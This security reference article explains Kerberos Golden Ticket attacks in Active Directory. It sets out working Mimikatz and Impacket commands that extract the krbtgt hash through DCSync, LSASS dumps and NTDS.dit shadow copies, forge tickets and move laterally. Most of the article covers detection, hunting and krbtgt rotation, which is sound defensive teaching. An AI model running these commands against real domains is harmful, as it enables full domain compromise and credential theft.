---
title: "Golden Ticket"
description: "Golden Ticket complete reference: krbtgt cryptographic role, DCSync mechanics, forging with Mimikatz and Impacket, detection with MDI and event correlation, and the two-rotation remediation procedure."
date: "2026-06-12 10:15"
category: "Active Directory"
tags:
  - Active Directory
  - Kerberos
  - Persistence
  - Domain Compromise
  - Threat Hunting
published: true
archived: false
pinned: false
featured: false
author: "Luca Manfrin"
readingTime: true
---

## Definition

A Golden Ticket is a forged Kerberos Ticket Granting Ticket (TGT) created using the NTLM hash (or AES keys) of the **krbtgt** account — the domain's Kerberos Key Distribution Center service account. Because every legitimate TGT in the domain is encrypted and signed with the krbtgt key, possessing it allows forging universally valid TGTs for any user, with any group membership, with any validity period. It is the highest-privilege persistence mechanism in Active Directory.

---

## The Role of krbtgt — Why It Is the Crown Jewel

The krbtgt account is created automatically when a domain is established. It has the following unique properties:

- **Never used for interactive logon** — no one logs into a machine as krbtgt
- **Password changes are controlled** — Windows never auto-rotates it (unlike computer accounts)
- **Cryptographic root of trust** — all TGTs are encrypted and signed with its key
- **Two versions of the hash are active simultaneously** — krbtgt keeps the current and previous password hash to support in-flight tickets during password changes

These properties make krbtgt uniquely dangerous: if compromised, the entire Kerberos trust model for the domain is broken. Every TGT the domain has ever issued should be considered suspect.

### krbtgt Hash Versions

When you rotate the krbtgt password, the old hash becomes the "previous" hash. The KDC accepts TGTs signed with either the current or the previous hash for up to `MaxTicketAge` (default: 10 hours). This is why **two rotations separated by 10+ hours** are required to completely invalidate all outstanding Golden Tickets.

---

## How an Attacker Obtains the krbtgt Hash

### Method 1: DCSync (Remote, Most Common)

DCSync abuses Active Directory replication protocols. Any account with `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights on the domain NC can pull password hashes from a DC without ever touching the DC's disk.

```cmd
# Mimikatz — DCSync for krbtgt
privilege::debug
lsadump::dcsync /user:krbtgt /domain:domain.local

# Pull all domain hashes
lsadump::dcsync /domain:domain.local /all /csv
```

```bash
# Impacket — remote DCSync
python3 secretsdump.py domain.local/DomainAdmin:password@dc01.domain.local \
  -just-dc-user krbtgt

# With existing TGT
export KRB5CCNAME=/tmp/admin.ccache
python3 secretsdump.py -k -no-pass dc01.domain.local -just-dc-user krbtgt
```

### Method 2: LSASS Dump on a Domain Controller

Domain controllers run LSASS with all domain account hashes in memory (including krbtgt). If an attacker gains code execution on a DC, LSASS is the shortest path.

```cmd
privilege::debug
sekurlsa::logonpasswords   # krbtgt hash appears here on a DC
```

### Method 3: NTDS.dit Extraction

The NTDS.dit file on a DC contains every domain account's credentials. Direct access requires either:
- SYSTEM privileges on a DC, or
- Volume Shadow Copy abuse

```cmd
# Via Volume Shadow Copy (native Windows)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
reg save HKLM\SYSTEM C:\Temp\system.hive
# Process offline
```

```bash
# Impacket — offline processing of NTDS.dit + SYSTEM hive
python3 secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

---

## How an Attacker Forges the Golden Ticket

### Required Information

| Item | How to Get |
|---|---|
| krbtgt NTLM hash | DCSync, LSASS, NTDS.dit |
| Domain SID | `Get-ADDomain`, `whoami /user` |
| Domain FQDN | Domain environment |
| Username to impersonate | Any string — real or invented |

```powershell
# Collect domain SID
(Get-ADDomain).DomainSID.Value
# S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX
```

### Forging with Mimikatz

```cmd
# Forge and inject Golden Ticket (RC4/NTLM-based)
kerberos::golden \
  /user:FakeAdmin \
  /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:9d765b482c0d55b5f7db2b154ef42ac9 \
  /groups:512,513,518,519,520 \
  /startoffset:0 \
  /endin:600 \
  /renewmax:10080 \
  /ptt

# AES256-based (harder to detect — AES256 tickets are the new normal)
kerberos::golden /user:FakeAdmin /domain:domain.local \
  /sid:S-1-5-21-XXX-XXX-XXX \
  /aes256:AES256KEYHERE \
  /groups:512 /ptt

# Write to file instead of injecting
kerberos::golden ... /ticket:C:\Temp\golden.kirbi
```

**Group RID reference** (declare any group membership):

| RID | Group |
|---|---|
| 512 | Domain Admins |
| 513 | Domain Users |
| 514 | Domain Guests |
| 516 | Domain Controllers |
| 518 | Schema Admins |
| 519 | Enterprise Admins |
| 520 | Group Policy Creator Owners |

### Forging with Impacket (Linux C2)

```bash
# ticketer.py — produce a .ccache file
python3 ticketer.py \
  -nthash 9d765b482c0d55b5f7db2b154ef42ac9 \
  -domain-sid S-1-5-21-XXX-XXX-XXX \
  -domain domain.local \
  -groups 512,519 \
  -user-id 500 \
  FakeAdmin

export KRB5CCNAME=FakeAdmin.ccache

# Use with Impacket tools
python3 psexec.py -k -no-pass domain.local/FakeAdmin@dc01.domain.local
python3 wmiexec.py -k -no-pass domain.local/FakeAdmin@anyserver.domain.local
```

---

## Security Problems

**1. The entire domain is compromised.** A Golden Ticket provides access to every resource in the domain — DCs, file servers, email, databases, cloud synced accounts.

**2. Password resets are ineffective.** Resetting the impersonated account's password does nothing. The Golden Ticket is signed by krbtgt, not the impersonated account. Only krbtgt rotation invalidates it.

**3. Arbitrary validity.** Attackers typically set 10-year ticket lifetimes. The ticket works until krbtgt is rotated (twice).

**4. Impersonate non-existent accounts.** The forgeed identity doesn't need to exist in AD. Accounts like `HealthMailbox_Admin` or `BackupServiceAccount` that look like service accounts can be conjured.

**5. Cross-realm attacks.** With inter-realm trust keys, Golden Tickets can be extended across forest trusts (trust ticket attacks). A compromised child domain can escalate to parent domain.

**6. Remediation requires coordinated action.** Invalidating Golden Tickets requires two krbtgt password resets separated by at least 10 hours — a domain-wide operational event.

**7. Undetectable without specialized tooling.** Standard DC event logs cannot distinguish a forged TGT from a legitimate one at authentication time.

---

## How to Detect It

### Why Standard Logs Fail

A properly crafted Golden Ticket passes all KDC validation checks: the signature is valid (because the attacker has the correct key), the PAC claims legitimate-looking group memberships, and the ticket lifetime can be set to match domain policy. The KDC sees it as a normal TGT.

Detection requires looking for **anomalies in ticket metadata** or **behavioral impossibilities**.

### Microsoft Defender for Identity (MDI)

MDI is the most effective detection tool for Golden Tickets. It analyzes Kerberos traffic at the DC network interface, comparing ticket lifetimes, PAC contents, and account behavior against learned baselines.

MDI detects:
- Tickets with lifetimes exceeding domain policy
- Tickets claiming group memberships inconsistent with AD state
- Tickets for accounts that don't exist in AD
- DCSync requests from non-DC machines (krbtgt dump precursor)

```powershell
# MDI sensor must be installed on all DCs
# Check MDI sensor status
Get-Service -Name AATPSensor -ComputerName dc01.domain.local
```

### DCSync Detection — The Precursor

Before forging a Golden Ticket, an attacker must obtain the krbtgt hash. DCSync is the most common method. Event ID 4662 on the DC captures this:

```powershell
# Detect DCSync: 4662 with DS-Replication-Get-Changes GUIDs
# from accounts that are not domain controllers
$dcSIDs = (Get-ADDomainController -Filter *).ComputerObjectSID

Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4662 } |
  Where-Object {
    # DS-Replication-Get-Changes     = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
    # DS-Replication-Get-Changes-All = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
    # DS-Replication-Get-Changes-In-Filtered-Set = 89e95b76-444d-4c62-991a-0facbeda640c
    $_.Properties[9].Value -match '1131f6aa|1131f6ad|89e95b76' -and
    $dcSIDs -notcontains $_.Properties[0].Value
  } |
  Select-Object TimeCreated,
    @{ n = 'SubjectAccount'; e = { $_.Properties[1].Value } },
    @{ n = 'SubjectSID';     e = { $_.Properties[0].Value } },
    @{ n = 'Properties';     e = { $_.Properties[9].Value } }
```

> [!WARNING]
> Azure AD Connect sync accounts also generate 4662 replication events. Add their SIDs to your whitelist before alerting.

### Detecting Tickets for Non-Existent Accounts

```powershell
# Look for Kerberos logons by accounts not present in AD
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object { $_.Properties[10].Value -eq 'Kerberos' } |
  ForEach-Object {
    $u = $_.Properties[5].Value
    if (
      $u -notmatch '^\$$' -and        # not a computer account
      $u -ne 'ANONYMOUS LOGON' -and
      -not (Get-ADUser -Filter { SamAccountName -eq $u } -ErrorAction SilentlyContinue)
    ) {
      [PSCustomObject]@{
        Time    = $_.TimeCreated
        Account = $u
        Source  = $_.Properties[18].Value
      }
    }
  }
```

### Anomalous Ticket Lifetime Detection

```powershell
# Domain ticket policy
$maxAge = (Get-ADDefaultDomainPasswordPolicy).MaxTicketAge.TotalHours
Write-Host "Max ticket age: $maxAge hours"

# 4768 events contain ticket lifetime — compare against policy
# Standard: if lifetime requested > MaxTicketAge → suspicious
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4768 } |
  Select-Object TimeCreated,
    @{ n = 'Account';    e = { $_.Properties[0].Value } },
    @{ n = 'ClientIP';   e = { $_.Properties[9].Value } },
    @{ n = 'TicketOptions'; e = { $_.Properties[3].Value } }
```

### Detect NTDS.dit / VSS Access

```powershell
# Sysmon Event 11 — file creation near NTDS.dit
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 11
} | Where-Object {
  $_.Properties[5].Value -match 'ntds\.dit|NTDS\\ntds|SYSTEM.*config'
} |
  Select-Object TimeCreated,
    @{ n = 'File';    e = { $_.Properties[5].Value } },
    @{ n = 'Process'; e = { $_.Properties[4].Value } }

# WMI-based VSS creation (common precursor to NTDS.dit theft)
Get-WinEvent -FilterHashtable @{
  LogName = 'Microsoft-Windows-Sysmon/Operational'; Id = 1
} | Where-Object {
  $_.Properties[10].Value -match 'vssadmin|wmic.*shadow|ntdsutil'
} |
  Select-Object TimeCreated,
    @{ n = 'CommandLine'; e = { $_.Properties[10].Value } },
    @{ n = 'User';        e = { $_.Properties[12].Value } }
```

---

## Honeypot for krbtgt Detection

There is no direct honeypot for Golden Ticket use — the forged ticket looks valid. However, you can create honeypot accounts whose names would appear in a forged PAC:

```powershell
# Create a monitoring account that is never used legitimately
New-ADUser -Name "svc_monitor_health" -SamAccountName "svc_monitor_health" `
  -AccountPassword (ConvertTo-SecureString "9!pK#4xM@2vN&7wQ^3rL*" -AsPlainText -Force) `
  -Enabled $false   # disabled — should NEVER produce a logon event

# Any 4624 for this account (even with Enabled=$false, a forged Golden Ticket
# with this username would still generate a logon event) is an immediate alert
Get-WinEvent -FilterHashtable @{ LogName = 'Security'; Id = 4624 } |
  Where-Object { $_.Properties[5].Value -eq 'svc_monitor_health' }
```

---

## How to Hunt It (Post-Incident)

### Phase 1 — Verify krbtgt password age and rotation history

```powershell
Get-ADUser -Identity krbtgt -Properties PasswordLastSet, PasswordNeverExpires,
  WhenCreated, DistinguishedName |
  Select-Object SamAccountName, PasswordLastSet, PasswordNeverExpires, WhenCreated

# Red flag: PasswordLastSet close to WhenCreated = never rotated since domain creation
$krbtgt = Get-ADUser krbtgt -Properties PasswordLastSet, WhenCreated
$daysSinceCreation = ((Get-Date) - $krbtgt.WhenCreated).Days
$daysSinceReset    = ((Get-Date) - $krbtgt.PasswordLastSet).Days
Write-Host "krbtgt created: $daysSinceCreation days ago | last password change: $daysSinceReset days ago"
```

### Phase 2 — Audit DCSync permissions

```powershell
# Who has DS-Replication-Get-Changes-All on the domain NC?
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-ACL -Path "AD:\$domainDN"

$acl.Access | Where-Object {
  $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2' -and
  $_.AccessControlType -eq 'Allow'
} | Select-Object IdentityReference, ObjectType, ActiveDirectoryRights

# Legitimate principals: Domain Controllers (group), AAD Connect, MSOL_ accounts
# Everything else should be investigated
```

### Phase 3 — Look for known Golden Ticket tools on disk

```powershell
$suspiciousFiles = @('mimikatz*.exe', 'mimikatz*.dll', 'mimi32.exe',
                     'sekurlsa.dll', 'lsadump.dll', 'golden*.kirbi',
                     'krbtgt*.kirbi', 'secretsdump*')

foreach ($pattern in $suspiciousFiles) {
  Get-ChildItem -Path C:\ -Recurse -Include $pattern -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, LastWriteTime, @{
      n = 'Hash'
      e = { (Get-FileHash $_.FullName -Algorithm SHA256).Hash }
    }
}
```

---

## How to Prevent It

### 1. Protect Domain Controllers — krbtgt Can Only Be Stolen There

```powershell
# Audit who has Domain Admin (can DCSync, log onto DCs)
Get-ADGroupMember 'Domain Admins' -Recursive | Select-Object SamAccountName, objectClass

# Audit who can log onto DCs (GPO: Allow log on locally)
# Only domain controllers and designated Tier 0 admins should appear
```

### 2. Rotate krbtgt Regularly and After Any Compromise

```powershell
# Download Microsoft's safe rotation script
# https://github.com/microsoft/New-KrbtgtKeys.ps1

# Simulation mode — shows what will happen without making changes
.\New-KrbtgtKeys.ps1 -Mode Simulation -Scope AllDCs

# Phase 1 rotation — execute on all DCs
.\New-KrbtgtKeys.ps1 -Mode Reset -Scope AllDCs

# WAIT: at least MaxTicketAge (default 10 hours) before Phase 2
# This ensures all legitimate TGTs issued before Phase 1 expire naturally

# Phase 2 rotation — invalidates tickets forged with Phase 1's hash
.\New-KrbtgtKeys.ps1 -Mode Reset -Scope AllDCs
```

> [!IMPORTANT]
> After Phase 1, some users may need to reauthenticate (if their TGTs were issued with the old hash and fall outside the 10-hour grace window). Plan this rotation for off-hours and communicate with users. Phase 2 is the critical step — without it, Golden Tickets using the Phase-1-era hash remain valid.

### 3. Audit and Restrict DCSync Rights

```powershell
# Remove replication rights from non-DC accounts (except AAD Connect / MSOL accounts)
$domainDN = (Get-ADDomain).DistinguishedName
$acl = Get-ACL -Path "AD:\$domainDN"

# Find offending ACEs
$acl.Access | Where-Object {
  $_.ObjectType -match '1131f6aa|1131f6ad' -and
  $_.AccessControlType -eq 'Allow' -and
  $_.IdentityReference -notmatch 'Domain Controllers|Enterprise Domain Controllers|MSOL_'
}

# Remove unauthorized ACE (use carefully in production)
# $acl.RemoveAccessRule($offendingACE)
# Set-ACL -Path "AD:\$domainDN" -AclObject $acl
```

### 4. Deploy Microsoft Defender for Identity

MDI is the only practical tool for detecting Golden Tickets in use. It is non-negotiable for any environment where you care about detecting post-domain-compromise activity.

Install MDI sensors on all DCs, ADCS servers, and ADFS servers.

### 5. Implement Protected Users for All Tier 0 Accounts

```powershell
# All Domain Admins → Protected Users
Get-ADGroupMember 'Domain Admins' -Recursive |
  ForEach-Object { Add-ADGroupMember -Identity 'Protected Users' -Members $_ }

# All Schema Admins, Enterprise Admins
foreach ($group in @('Schema Admins','Enterprise Admins')) {
  Get-ADGroupMember $group -Recursive |
    ForEach-Object { Add-ADGroupMember -Identity 'Protected Users' -Members $_ }
}
```

### 6. Implement Tiered Administration and PAWs

Tier 0 admins must only log onto Tier 0 machines (DCs, PAWs). If a Domain Admin never interactively logs onto a workstation, their credentials are never cached there, and DCSync requires a genuine DC compromise.

---

## Conclusion

The Golden Ticket is Active Directory's most severe persistence mechanism. Once the krbtgt hash is extracted, the attacker holds a master key valid for the entire domain's lifetime unless explicitly rotated. Defense requires protecting the domain controllers absolutely (they are the only source of the krbtgt hash), detecting the extraction event (DCSync), and accepting that post-extraction the response is: two krbtgt rotations, a full forensic review, and potentially a domain rebuild. Microsoft Defender for Identity is not optional for any environment that has a mature security posture — it is the detection tooling that makes Golden Ticket use visible.
